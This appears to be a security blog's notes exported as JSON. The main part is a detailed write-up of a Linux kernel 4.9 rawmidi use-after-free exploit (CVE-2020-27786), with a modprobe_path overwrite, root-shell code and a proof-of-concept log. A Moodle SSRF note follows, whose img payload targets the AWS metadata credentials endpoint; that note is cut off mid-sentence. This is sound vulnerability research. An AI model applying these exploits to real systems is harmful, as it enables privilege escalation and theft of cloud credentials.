iov_buf;\niov[0].iov_len = 0x1000;\niov[1].iov_base = iov_buf;\niov[1].iov_len = 0x1337;\nint pp[2];\npipe(pp);\nif(!fork()){\n\tkfree(chunk); // Freeing the chunk just before allocating the iovec\n\treadv(pp[0], iov, 10); // allocate iovec and blocks (keeping the object in the kernel) \n\texit(0);\n}\nsleep(1); // Give time to the child process\nread_memory(chunk, 0x40);\n\n\n```\n\nThen, with `read_memory` we can show the block of memory in our interest and as you can see from the following output, our arbitrary allocated/freed object has been replaced with the target object: \n```C\nAllocated chunk @0xffffffc0052c5a00\n0xffffffc0052c5a00:     0x0000007fd311ff58 0x0000000000001000\n0xffffffc0052c5a10:     0x0000007fd311ff58 0x0000000000001337\n0xffffffc0052c5a20:     0x0000000000000000 0x0000000000000000\n0xffffffc0052c5a30:     0x0000000000000000 0x0000000000000000\n```\n\nInstead of just print the content, you can simulate a UAF read/write using `k[read|write]` and play with it.\n\nThe full code of this example can be found in `client/example/02.c`\n\n## Setup\nTo compile the module change the `K` variable in the `Makefile` with your compiled kernel root directory and compile with `make`, then `insmod`.\n\n## Conclusions\nPersonally, I used it to study the SLUB allocator, understand UAF/Heap Overflows/Double Free/userfaultd and some hardening features in the kernel, but it can assist the exploitation phase too or more. Blog posts on some Kernel vulnerabilities and their attack methodologies will follow these months and this module will come useful to demonstrate them. So, stay tuned and enjoy !\n\nPS. The \"Execute\" part of the name will be a future implementation to control `pc/rip`.","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/Linux-Kernel-n-day-exploit-development":{"title":"Linux Kernel n-day exploit development","content":"## Introduction\nIn the previous article ([[Hunting for Linux kernel public vulnerabilities]]) I described how I identified a good candidate vulnerability using public resources to practise some exploitation techiques. In this blog post I will detail the exploitation phase of a race condition that leads to an Use-After-Free in Linux kernel 4.9.223.\n## TL;DR\nThe vulnerability is a Race Condition that causes a write Use-After-Free. The race window has been extended using the userfaultd technique handling page faults from user-space and using `msg_msg` to leak a kernel address and I/O vectors to obtain a write primitive. With the write primitive, the `modprobe_path` global  variable has been overwritten and a root shell popped.\n\n## RAWMIDI interface\nBefore facing the vulnerability, let's see few important things needed to follow this write-up. The vulnerable driver is exposed as a character device in `/dev/snd/midiC0D*` (or similar name based on the platform) and depends on [CONFIG_SND_RAWMIDI](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/Kconfig#L21). It exposes the following file operations:\n```C\n// https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L1507\nstatic const struct file_operations snd_rawmidi_f_ops =\n{\n\t.owner =\tTHIS_MODULE,\n\t.read =\t\tsnd_rawmidi_read,\n\t.write =\tsnd_rawmidi_write,\n\t.open =\t\tsnd_rawmidi_open,\n\t.release =\tsnd_rawmidi_release,\n\t.llseek =\tno_llseek,\n\t.poll =\t\tsnd_rawmidi_poll,\n\t.unlocked_ioctl =\tsnd_rawmidi_ioctl,\n\t.compat_ioctl =\tsnd_rawmidi_ioctl_compat,\n};\n```\n\nThe ones we are interesed into are `open`, `write` and `unlocked_ioctl`.\n\n### open\nThe open ([snd_rawmidi_open](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L374)) operation allocates everything needed to interact with the device, but what is just necessary to know for us is the first allocation of `snd_rawmidi_runtime-\u003ebuffer` as `GFP_KERNEL` with a size of 4096 (PAGE_SIZE) bytes. This is the [snd_rawmidi_runtime](https://elixir.bootlin.com/linux/v4.9.223/source/include/sound/rawmidi.h#L67) struct:\n```C\nstruct snd_rawmidi_runtime {\n\tstruct snd_rawmidi_substream *substream;\n\tunsigned int drain: 1,\t/* drain stage */\n\t\t     oss: 1;\t/* OSS compatible mode */\n\t/* midi stream buffer */\n\tunsigned char *buffer;\t/* buffer for MIDI data */\n\tsize_t buffer_size;\t/* size of buffer */\n\tsize_t appl_ptr;\t/* application pointer */\n\tsize_t hw_ptr;\t\t/* hardware pointer */\n\tsize_t avail_min;\t/* min avail for wakeup */\n\tsize_t avail;\t\t/* max used buffer for wakeup */\n\tsize_t xruns;\t\t/* over/underruns counter */\n\t/* misc */\n\tspinlock_t lock;\n\twait_queue_head_t sleep;\n\t/* event handler (new bytes, input only) */\n\tvoid (*event)(struct snd_rawmidi_substream *substream);\n\t/* defers calls to event [input] or ops-\u003etrigger [output] */\n\tstruct work_struct event_work;\n\t/* private data */\n\tvoid *private_data;\n\tvoid (*private_free)(struct snd_rawmidi_substream *substream);\n};\n```\n\n### write\nAfter having allocated everything from the `open` operation, we can write into the file descriptor like `write(fd, \u0026buf, 10)`. In that way, it will fill 10 bytes into the `snd_rawmidi_runtime-\u003ebuffer` and using `snd_rawmidi_runtime-\u003eappl_ptr` it will remember the offset to start writing again later.\nIn order to write into that buffer, the driver does the following calls: [snd_rawmidi_write](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1309) =\u003e [snd_rawmidi_kernel_write1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242) =\u003e `copy_from_user`\n\n\n### ioctl\nThe [snd_rawmidi_ioctl](https://elixir.bootlin.com/linux/v4.9.223/C/ident/snd_rawmidi_ioctl) is responsible to handle IOCTL commands and the one we are interested in is `SNDRV_RAWMIDI_IOCTL_PARAMS` that calls [snd_rawmidi_output_params](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L637) with user-controllable parameter:\n```C\nint snd_rawmidi_output_params(struct snd_rawmidi_substream *substream,\n\t\t\t      struct snd_rawmidi_params * params)\n{\n\t// [..] few checks\n\tif (params-\u003ebuffer_size != runtime-\u003ebuffer_size) {\n\t\tnewbuf = kmalloc(params-\u003ebuffer_size, GFP_KERNEL); //[1]\n\t\tif (!newbuf)\n\t\t\treturn -ENOMEM;\n\t\tspin_lock_irq(\u0026runtime-\u003elock);\n\t\toldbuf = runtime-\u003ebuffer;\n\t\truntime-\u003ebuffer = newbuf; // [2]\n\t\truntime-\u003ebuffer_size = params-\u003ebuffer_size;\n\t\truntime-\u003eavail = runtime-\u003ebuffer_size;\n\t\truntime-\u003eappl_ptr = runtime-\u003ehw_ptr = 0;\n\t\tspin_unlock_irq(\u0026runtime-\u003elock);\n\t\tkfree(oldbuf); //[3]\n\t}\n\t// [..]\n}\n```\n\nThis IOCTL is crucial for this vulnerability. With this command it's possible to re-size the internal buffer with an arbitrary value reallocating it[1] and later replace that buffer with the older one [2], that will be freed[3].\n\n## Vulnerability Analysis\nThe vulnerability has been patched by the commit \"c13f1463d84b86bedb664e509838bef37e6ea317\" that introduced a reference counter on the targeted vulnerable buffer. In order to understand where the vulnerbility lived it's a good thing to see its patch:\n```diff\ndiff --git a/include/sound/rawmidi.h b/include/sound/rawmidi.h\nindex 5432111c8761..2a87128b3075 100644\n--- a/include/sound/rawmidi.h\n+++ b/include/sound/rawmidi.h\n@@ -76,6 +76,7 @@ struct snd_rawmidi_runtime {\n        size_t avail_min;       /* min avail for wakeup */\n        size_t avail;           /* max used buffer for wakeup */\n        size_t xruns;           /* over/underruns counter */\n+       int buffer_ref;         /* buffer reference count */\n        /* misc */\n        spinlock_t lock;\n        wait_queue_head_t sleep;\ndiff --git a/sound/core/rawmidi.c b/sound/core/rawmidi.c\nindex 358b6efbd6aa..481c1ad1db57 100644\n--- a/sound/core/rawmidi.c\n+++ b/sound/core/rawmidi.c\n@@ -108,6 +108,17 @@ static void snd_rawmidi_input_event_work(struct work_struct *work)\n                runtime-\u003eevent(runtime-\u003esubstream);\n }\n \n+/* buffer refcount management: call with runtime-\u003elock held */\n+static inline void snd_rawmidi_buffer_ref(struct snd_rawmidi_runtime *runtime)\n+{\n+       runtime-\u003ebuffer_ref++;\n+}\n+\n+static inline void snd_rawmidi_buffer_unref(struct snd_rawmidi_runtime *runtime)\n+{\n+       runtime-\u003ebuffer_ref--;\n+}\n+\n static int snd_rawmidi_runtime_create(struct snd_rawmidi_substream *substream)\n {\n        struct snd_rawmidi_runtime *runtime;\n@@ -654,6 +665,11 @@ int snd_rawmidi_output_params(struct snd_rawmidi_substream *substream,\n                if (!newbuf)\n                        return -ENOMEM;\n                spin_lock_irq(\u0026runtime-\u003elock);\n+               if (runtime-\u003ebuffer_ref) {\n+                       spin_unlock_irq(\u0026runtime-\u003elock);\n+                       kfree(newbuf);\n+                       return -EBUSY;\n+               }\n                oldbuf = runtime-\u003ebuffer;\n                runtime-\u003ebuffer = newbuf;\n                runtime-\u003ebuffer_size = params-\u003ebuffer_size;\n@@ -962,8 +978,10 @@ static long snd_rawmidi_kernel_read1(struct snd_rawmidi_substream *substream,\n        long result = 0, count1;\n        struct snd_rawmidi_runtime *runtime = substream-\u003eruntime;\n        unsigned long appl_ptr;\n+       int err = 0;\n \n        spin_lock_irqsave(\u0026runtime-\u003elock, flags);\n+       snd_rawmidi_buffer_ref(runtime);\n        while (count \u003e 0 \u0026\u0026 runtime-\u003eavail) {\n                count1 = runtime-\u003ebuffer_size - runtime-\u003eappl_ptr;\n                if (count1 \u003e count)\n@@ -982,16 +1000,19 @@ static long snd_rawmidi_kernel_read1(struct snd_rawmidi_substream *substream,\n                if (userbuf) {\n                        spin_unlock_irqrestore(\u0026runtime-\u003elock, flags);\n                        if (copy_to_user(userbuf + result,\n-                                        runtime-\u003ebuffer + appl_ptr, count1)) {\n-                               return result \u003e 0 ? result : -EFAULT;\n-                       }\n+                                        runtime-\u003ebuffer + appl_ptr, count1))\n+                               err = -EFAULT;\n                        spin_lock_irqsave(\u0026runtime-\u003elock, flags);\n+                       if (err)\n+                               goto out;\n                }\n                result += count1;\n                count -= count1;\n        }\n+ out:\n+       snd_rawmidi_buffer_unref(runtime);\n        spin_unlock_irqrestore(\u0026runtime-\u003elock, flags);\n-       return result;\n+       return result \u003e 0 ? result : err;\n }\n \n long snd_rawmidi_kernel_read(struct snd_rawmidi_substream *substream,\n@@ -1262,6 +1283,7 @@ static long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream,\n                        return -EAGAIN;\n                }\n        }\n+       snd_rawmidi_buffer_ref(runtime);\n        while (count \u003e 0 \u0026\u0026 runtime-\u003eavail \u003e 0) {\n                count1 = runtime-\u003ebuffer_size - runtime-\u003eappl_ptr;\n                if (count1 \u003e count)\n@@ -1293,6 +1315,7 @@ static long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream,\n        }\n       __end:\n        count1 = runtime-\u003eavail \u003c runtime-\u003ebuffer_size;\n+       snd_rawmidi_buffer_unref(runtime);\n\n```\n\nTwo functions were added: [snd_rawmidi_buffer_ref](https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L112) and [snd_rawmidi_buffer_unref](https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L117). They are respectively used to take and remove a reference to the buffer using `snd_rawmidi_runtime-\u003ebuffer_ref` when it is copying ([snd_rawmidi_kernel_read1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L957)) or writing ([snd_rawmidi_kernel_write1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242)) into that buffer. But why this was needed? Because read and write operations handled by [snd_rawmidi_kernel_write1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242) and [snd_rawmidi_kernel_read1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L957) temporarly unlock the runtime lock during the copying from/to userspace using `spin_unlock_irqrestore`[1]/`spin_lock_irqrestore`[2] giving a small race window where the object can be modified during the `copy_from_user` call:\n```C\nstatic long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream, const unsigned char __user *userbuf, const unsigned char *kernelbuf, long count) {\n\t// [..]\n\t\t\tspin_unlock_irqrestore(\u0026runtime-\u003elock, flags); // [1]\n\t\t\tif (copy_from_user(runtime-\u003ebuffer + appl_ptr,\n\t\t\t\t\t   userbuf + result, count1)) {\n\t\t\t\tspin_lock_irqsave(\u0026runtime-\u003elock, flags);\n\t\t\t\tresult = result \u003e 0 ? result : -EFAULT;\n\t\t\t\tgoto __end;\n\t\t\t}\n\t\t\tspin_lock_irqsave(\u0026runtime-\u003elock, flags); // [2]\n\t// [..]\n\n}\n```\n\nIf a concurrent thread re-allocate the `runtime-\u003ebuffer` using the `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl, that thread can lock the object from `spin_lock_irq` [1] (that has been left unlocked in the small race window given by `snd_rawmidi_kernel_write1`) and free that buffer[2], making possible to re-allocate an arbitrary object and write on that. Also, the `kmalloc`[3] in `snd_rawmidi_output_params` is called with `params-\u003ebuffer_size` that is totally user controllable.\n\n```C\nint `snd_rawmidi_output_params`(struct snd_rawmidi_substream *substream,\n\t\t\t      struct snd_rawmidi_params * params)\n{\n\t// [..]\n\tif (params-\u003ebuffer_size != runtime-\u003ebuffer_size) {\n\t\tnewbuf = kmalloc(params-\u003ebuffer_size, GFP_KERNEL); // [3]\n\t\tif (!newbuf)\n\t\t\treturn -ENOMEM;\n\t\tspin_lock_irq(\u0026runtime-\u003elock); // [1]\n\t\toldbuf = runtime-\u003ebuffer;\n\t\truntime-\u003ebuffer = newbuf;\n\t\truntime-\u003ebuffer_size = params-\u003ebuffer_size;\n\t\truntime-\u003eavail = runtime-\u003ebuffer_size;\n\t\truntime-\u003eappl_ptr = runtime-\u003ehw_ptr = 0;\n\t\tspin_unlock_irq(\u0026runtime-\u003elock);\n\t\tkfree(oldbuf); // [3]\n\t}\n\t// [..]\n}\n```\n\nWhat happen if, while a thread is writing into the buffer with `copy_from_user`, another thread frees that buffer using the `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl and reallocates a new arbitrary one? The object is replaced with an new one and the `copy_from_user` will continue writing into another object (the \"victim object\") corrupting its values =\u003e User-After-Free (Write).\n\nThe really good part about this vulnerability is the \"freedom\" you can have:\n- It's possible to call `kmalloc` with an arbitrary size (and this will be the freed object that we are going to replace to cause a UAF) which means that we can target our favourite slab cache (based on what we need, ofc)\n- We can write as much as we want in the buffer with the `write` syscall\n\n## Extend the Race Time Window\nWe know we have a small race window with few instructions while copying data from userland to kernel as explained before, but the great news is that we have a `copy_from_user` that can be suspended arbitrarly handling page fault in user-space ! Since I was exploiting the vulnerability in a 4.9 kernel (4.9.223) and hence userfaultd is still not unprivileged as in \u003e5.11, we can still use it to extend our race window and have the necessary time to re-allocate a buffer!\n\n## Exploitation Plan\nWe stated that we are going to use the userfaultd technique to extend the time window. If you are new to this technique is well explained [here](https://lwn.net/Articles/819834/), in this [video](https://www.youtube.com/watch?v=6dFmH_JEF4s) (you can use substitles) and [here](https://blog.lizzie.io/using-userfaultfd.html). To summarize: you can handle page faults from user-land, temporarly blocking kernel execution while handling the page fault. If we `mmap` a block of memory with `MAP_ANONYMOUS` flag, the memory will be demand-zero paged, meaning that it's not yet allocated and we can allocate it via userfaultd.\nThe idea using this technique is:\n- Initialize the `runtime-\u003ebuffer` with `open` =\u003e This will allocate the buffer with 4096 size (that will land in `kmalloc-4096`)\n- Send `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl command in order to re-allocate the buffer with our desired size (e.g. 30 wil land in `kmalloc-32`)\n- Allocate with `mmap` a demand-zero paged (`MAP_ANON`) and initialize `userfaultd` to handle its page fault\n- `write` to the rawmidi file descriptor using our previously allocated mmaped memory =\u003e This will trigger the userland page fault in `copy_from_user`\n- While the kernel thread is suspended waiting for the userland page fault we can send again the `SNDRV_RAWMIDI_IOCTL_PARAMS` in order to free the current `runtime-\u003ebuffer`\n- We allocate an object in, for example, `kmalloc-32` and if we did some spray before on that cache it will take the place of the previous freed `runtime-\u003ebuffer`\n- We release the page fault from userland and the `copy_from_user` will continue writing its data (totally in user control) to the new allocated object\n\nWith this primitive, we can forges arbitrary objects with **arbitrary size** (specified in the `write` syscall), **arbitrary content**, **arbitrary offset** (since we can trigger userfaultd between two pages as demostrated later on) and **arbitrary cache** (we can control the size allocation in the `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl).\nAs you can deduce, we have a really great and powerful primitive !\n\n## Information Leak\n### Victim Object\nWe are going to use what we previously explained in the \"Exploitation Plan\" section to leak an address that we will re-use to have an arbitrary write. Since we can choose which cache trigger the UAF on (and that's gold from an exploitation point of view) I choose to leak the `shm_file_data-\u003ens` pointer that points to `init_ipc_ns` in the kernel `.data` section and it lives in `kmalloc-32` (I also used the same function to spray the `kmalloc-32` cache):\n\n```C\nvoid alloc_shm(int i)\n{\n\tint shmid[0x100]     = {0};\n\tvoid *shmaddr[0x100] = {0};\n    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);\n    if (shmid[i]  \u003c 0) errExit(\"shmget\");\n    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);\n    if (shmaddr[i] \u003c 0) errExit(\"shmat\");\n}\nalloc_shm(1)\n```\n\nFrom that pointer, we will deduce the pointer of `modprobe_path` in order to use that technique later to elevate our privileges.\n\n### msg_msg\n```C\nstruct msg_msg {\n\tstruct list_head m_list;\n\tlong m_type;\n\tsize_t m_ts;\t\t/* message text size */\n\tstruct msg_msgseg *next;\n\tvoid *security;\n\t/* the actual message follows immediately */\n};\n\nstruct msg_msgseg {\n\tstruct msg_msgseg *next;\n\t/* the next part of the message follows immediately */\n};\n\n```\nIn order to leak that address, however, we have to compromise some other object in `kmalloc-32`, maybe a length field that would read after its own object. For that case, `msg_msg` is our perfect match because it has a length field specified in its `msg_msg-\u003em_ts` and it can be allocated in almost any cache starting from `kmalloc-32` to `kmalloc-4096`, with just one downside: The minimun allocation for the `msg_msg` struct is 48 (`sizeof(struct msg_msg)`) and it can lands minimun at `kmalloc-64`.\nIf you want to read more about this structure you can checkout [Fire of Salvation Writeup](https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html), [Wall Of Perdition](https://syst3mfailure.io/wall-of-perdition) and the [kernel source code](https://elixir.bootlin.com/linux/v4.9.223/source/ipc/msg.c).\nHowever, when a message is sent using `msgsnd` with size more than [DATALEN_MSG](https://elixir.bootlin.com/linux/v4.9.223/source/ipc/msgutil.c#L46) (`((size_t)PAGE_SIZE-sizeof(struct msg_msg))`) that is 4096-48, a segment (or multiple segments if needed) is allocated, and the message is splitted between the `msg_msg` (the payload is just after the struct headers) and the `msg_msgseg`, with the total size of the message specified in `msg_msg-\u003em_ts`. \n\nIn order to allocate our target object in `kmalloc-32` we have to send a message with size: ( ( 4096 - 48 ) + 10 ).\n- The `msg_msg` structure will be allocated in `kmalloc-4096` and the first (4096 - 48) bytes will be written in the `msg_msg` structure.\n- To allocate the remaining 10 bytes, a segment `msg_msgseg` will be allocated in `kmalloc-32`\n\nWith these conditions, we can forge the `msg_msg` structure in `kmalloc-4096` overwriting its `m_ts` value with our UAF and with `msgrcv` we can receive a message that will contains values past our segment allocated in `kmalloc-32` (including our targeted `init_ipc_ns` pointer).\n\n#### Dealing with offsets\nHowever, we want to overwrite the `m_ts` value without overwriting anything else in the `msg_msg` structure, how we can do that?\nIf you remember, I said we can overwrite chunks with arbitrary size, content and **offset**. If we create a `mmap` memory with size `PAGE_SIZE * 2` (two pages) and we handle the page fault only for the second page, we can start writing into the original `runtime-\u003ebuffer` and trigger the page fault when it receives the `msg_msg-\u003em_ts` offset (0x18). Now that the kernel thread is blocked, it's possible to replace the object with `msg_msg` and when the `copy_from_user` resumes, it will starts writing exactly at the `msg_msg-\u003em_ts` value the remaining bytes. The size we are writing into the file descriptor is (0x18 + 0x2) since the first 0x18 bytes will be used to land at the exact offset and the 2 remaining bytes will write `0xffff` in `msg_msg-\u003em_ts`. The concept is also explained in the following picture:\n\n![[2.png]]\n\nNow from the received message from `msgrcv` we can retrieve the `init_ipc_ns` pointer from `shm_file_data` and we can deduce the `modprobe_path` address calculating its offset and proceed with the arbitrary write phase.\n\n## Arbitrary Write\nIn order to write at arbitrary locations we are using the same userfault technique described above but instead of targeting `msg_msg` we will use the Vectored I/O (`pipe` + `iovec`) primitive. This primitive has been fixed in kernel 4.13 with [copyin](https://elixir.bootlin.com/linux/v4.13.1/source/lib/iov_iter.c#L142) and [copyout](https://elixir.bootlin.com/linux/v4.13.1/source/lib/iov_iter.c#L133) wrappers, with an `access_ok` addition. This technique has been widely used exploiting the Android Binder CVE-2019-2215 and is well detailed [here](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html) and [here](https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer).\n\nThe idea is to trigger the UAF once again but targeting the [iovec](https://elixir.bootlin.com/linux/v4.9.223/source/include/uapi/linux/uio.h#L16) struct:\n\n```C\nstruct iovec\n{\n\tvoid __user *iov_base;\t/* BSD uses caddr_t (1003.1g requires void *) */\n\t__kernel_size_t iov_len; /* Must be size_t (1003.1g) */\n};\n```\n\nThe [minimun allocation](https://elixir.bootlin.com/linux/v4.9.223/source/fs/read_write.c#L792) for `iovec` occurs with `sizeof(struct iovec) * 9` or `16 * 9` (144) that will land at `kmalloc-192` (otherwise it is stored in the stack). However I choose to allocate 13 vectors using `readv` to make the object land in `kmalloc-256`.\n```C\n    int pipefd[2];\n    pipe(pipefd)\n    // [...]\n    struct iovec iov_read_buffers[13] = {0};\n    char read_buffer0[0x100];\n    memset(read_buffer0, 0x52, 0x100);\n    iov_read_buffers[0].iov_base = read_buffer0;\n    iov_read_buffers[0].iov_len= 0x10;\n    iov_read_buffers[1].iov_base = read_buffer0;\n    iov_read_buffers[1].iov_len= 0x10;\n    iov_read_buffers[8].iov_base = read_buffer0;\n    iov_read_buffers[8].iov_len= 0x10;\n    iov_read_buffers[12].iov_base = read_buffer0;\n    iov_read_buffers[12].iov_len= 0x10;\n\n    if(!fork()){\n        ssize_t readv_res = readv(pipefd[0], iov_read_buffers, 13); // 13 * 16 = 208 =\u003e kmalloc-256\n        exit(0);\n    }\n```\n\nThe `readv` is a blocking call that **stays** (does not free) the object in the kernel so that we can corrupt it using our UAF and re-use it later with our arbitrary modified content. If we corrupt the `iov_base` of an `iovec` structure we can write at arbitrary kernel addresses with a `write` syscall since it is uses the unsafe [\\_\\_copy_from_user](https://elixir.bootlin.com/linux/v4.9.223/source/lib/iov_iter.c#L267) (same as `copy_from_user` but without checks).\n\n![[3.png]]\n\nOur idea is:\n- Resize the `runtime-\u003ebuffer` with `SNDRV_RAWMIDI_IOCTL_PARAMS` in order to lands into`kmalloc-256` with a size greater than 192\n- `write` into the file descriptor specifycing a demanded-zero paged memory (`MAP_ANON`) so that `copy_from_user` will stop its execution waiting for our user-land page fault handler\n- While the kernel thread is waiting, free the buffer using again the re-size ioctl command `SNDRV_RAWMIDI_IOCTL_PARAMS`\n- Allocate the `iovec` struct using `readv` that will replace the previously allocated `runtime-\u003ebuffer`\n- Resume the kernel execution releasing the page fault handler. Now the `copy_from_user` will start to write into the `iovec` structure and we will overwrite `iov[1].iov_base` with the `modprobe_path` address.\n\nNow, in order to overwrite the `modprobe_path` value we just have to write our arbitrary content using the `write` syscall into `pipe[0]`. In the released exploit I overwrote the second iov entry (`iov[1]`) using the same technique described before with adjacent pages. However, it's also possible to directly overwrite the first `iov[0].iov_base`.\n\nNice ! Now we have overwritten `modprobe_path` with `/tmp/x` and .. it's time to pop a shell !\n\n### modprobe_path \u0026 uid=0\nIf you are not familiar with `modprobe_path` I suggest you to check out [Exploiting timerfd_ctx Objects In The Linux Kernel](https://syst3mfailure.io/hotrod) and the [man page](https://man7.org/linux/man-pages/man2/userfaultfd.2.html).\nTo summarize, `modprobe_path` is a global variable with a default value of `/sbin/modprobe` used by `call_usermodehelper_exec` to execute a user-space program in case a program with an unkown header is executed.\nSince we have overwritten `modprobe_path` with `/tmp/x`, when a file with an unknown header is executed, our controllable script is executed as root.\n\nThese are the exploit functions that prepares and later executes a suid shell:\n\n```C\nvoid prep_exploit(){\n    system(\"echo '#!/bin/sh' \u003e /tmp/x\");\n    system(\"echo 'touch /tmp/pwneed' \u003e\u003e /tmp/x\");\n    system(\"echo 'chown root: /tmp/suid' \u003e\u003e /tmp/x\");\n    system(\"echo 'chmod 777 /tmp/suid' \u003e\u003e /tmp/x\");\n    system(\"echo 'chmod u+s /tmp/suid' \u003e\u003e /tmp/x\");\n    system(\"echo -e '\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd' \u003e /tmp/nnn\");\n    system(\"chmod +x /tmp/x\");\n    system(\"chmod +x /tmp/nnn\");\n}\n\nvoid get_root_shell(){\n    system(\"/tmp/nnn 2\u003e/dev/null\");\n    system(\"/tmp/suid 2\u003e/dev/null\");\n}\n\nint main(){\n\tprep_exploit();\n\t// [..] exploit stuff\n\tget_root_shell(); // pop a root shell\n}\n\n```\n\nWhat the exploit does is simply create the `/tmp/x` binary that will suid as root a file dropped in `/tmp/suid` and create a file with an unknown header (`/tmp/nnn`) that will trigger the executon as root of `/tmp/x` from `call_usermodehelper_exec`. After that, the `/tmp/suid` gives root privileges and spawns a root shell.\n\nPOC:\n```bash\n/ $ uname -a                                   \nLinux (none) 4.9.223 #3 SMP Wed Jun 1 23:15:02 CEST 2022 x86_64 GNU/Linux \n/ $ id\nuid=1000(user) gid=1000 groups=1000\n/ $ /main \n[*] Starting exploitation ..\n[+] userfaultfd registered\n[*] First write to init substream..\n[*] Resizing buffer_size to 4096 ..\n[*] snd_write triggered (should fault) \n[*] Freeing buf using SNDRV_RAWMIDI_IOCTL_PARAMS\n[+] Page Fault triggered for 0x5551000!\n[*] Replacing freed obj with msg_msg .\n[*] Waiting for userfaultd to finish ..\n[*] Page fault thread terminated\n[+] Page fault lock released\n[+] init_ipc_ns @0xffffffff81e8d560\n[+] calculated modprobe_path @0xffffffff81e42a00\n[+] Starting the arbitrary write phase ..\n[*] Closing and reopening re-opening rawmidi fd ..\n[+] userfaultfd registered\n[*] First write to init substream..\n[*] Resizing buffer_size to land into kmalloc-256 ..\n[*] snd_write triggered (should fault) \n[*] Freeing buf from SNDRV_RAWMIDI_IOCTL_PARAMS\n[+] Page Fault triggered for 0x7771000!\n[*] Waiting for readv ..\n[*] Page fault thread terminated\n[+] Page fault lock released\n[*] Writing into the pipe ..\n[*] write = 24\n[+] enjoy your r00t shell [:\n/ # id\nuid=0(root) gid=0 groups=1000\n/ #\n```\n\n## Conclusion\nThat was my journey into exploiting a known vulnerability in the `4.9.223` kernel. You can find the whole exploit on github: https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit.\n\n## References\n- https://1day.dev/2022-06/1day-devel-part-1.html\n- https://elixir.bootlin.com/linux/v4.9.223/source/\n- https://lwn.net/Articles/819834/\n- https://www.youtube.com/watch?v=6dFmH_JEF4s\n- https://blog.lizzie.io/using-userfaultfd.html\n- https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html\n- https://syst3mfailure.io/wall-of-perdition\n- https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html\n- https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer\n- https://syst3mfailure.io/hotrod\n- https://man7.org/linux/man-pages/man2/userfaultfd.2.html\n- https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/Moodle-Server-Side-Request-Forgery-SSRF":{"title":"Moodle Server-Side Request Forgery","content":"\nDuring the research time in Hacktive Security I found 2 Server-Side Request Forgery on Moodle. The first one is a Blind SSRF already discovered in 2018 and tracked as CVE-2018-1042 without a proper patch, the other one is a fresh SSRF while parsing image tags inside the same component (**File Picker**). \n\n**They are currently not patched and both working on the latest Moodle version** because the Moodle Team, as they said from emails, leaves the responsibility to protect network interactions to system administrators. I personally do not agree with this statement because it leaves a dangerous vulnerability in a vanilla installation that can lead critical scenarios especially on cloud based hosting. So, in order to protect your Moodle installation, check out the Workaround section at the end of the article.\n\nLet's deppen these vulnerabilities starting from the impacted component, the File Picker.\n\n## File Picker\n\nThe File picker is a core Moodle component used to handle file uploads for multiple scopes. For example, it is used in the user's profile picture handling or in 'Private Files', a dedicated area for any authenticated user. You can easily upload a file, but also retrieve an image from an **arbitrary URL(!)**.\n\nAs it is used for multiple purposes, it is by default accessible to any authenticated user (also low privilege ones).\n\n## The fresh SSRF\n\nThe vulnerability resides on image parsing from an arbitrary URL (when an user choose to retrieve an image using the URL, as mentioned before).\nIf you request an HTML page, Moodle will fetch all `\u003cimg\u003e` tags inside it and ask you to choose which image you want to download. It extracts the src attribute for all image tags in the page and directly downloads the image, without further checks. That means that if we request the image from a server we control, we can request an HTML page with an arbitrary URL inside an image tag and Moodle will perform this arbitrary request for us. Then we can save the fake image (that contains the response for the SSRF) and display its result.\n\n### POC\n\n![img1](/notes/images/moodle/1.png)/notes/images/android/\n\nFrom the 'URL Downloader' action inside the File Picker, we can put a URL to our server that points to /index.html, that will contains the following payload:\n\n``\n\u003cimg src=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\u003e\n``\n\nThe request will catch our 'src' attribute as follow:\n\n\n![img2](/notes/images/moodle/2.png)\n\nThat will result, in the UI, in the following selection:\n\n![img3](/notes/images/moodle/3.png)\n\nWe can click on the box, and choose to download the fetced 'image'\n\n![img4](/notes/images/moodle/4.png)\n\nIn order to download the response, we have to provide a custom extension in the title name and customize the accepted_types[] parameter according to it (for example .arbitraryExtension)\n\n![img5](/notes/images/moodle/5.png)\n\nhe returned JSON response will contain the path to the result file (with the arbitrary request's response), that we can download with a GET request:\n\n![img6](/notes/images/moodle/6.png)\n\nBy automating this whole process with an exploit, we can now easily interact with local services.\n\nFor example, in a AWS EC2 instance we can interact with the Meta and User Data API internal endpoint at 169.254.169.254 (You can find more about this API at [AWS 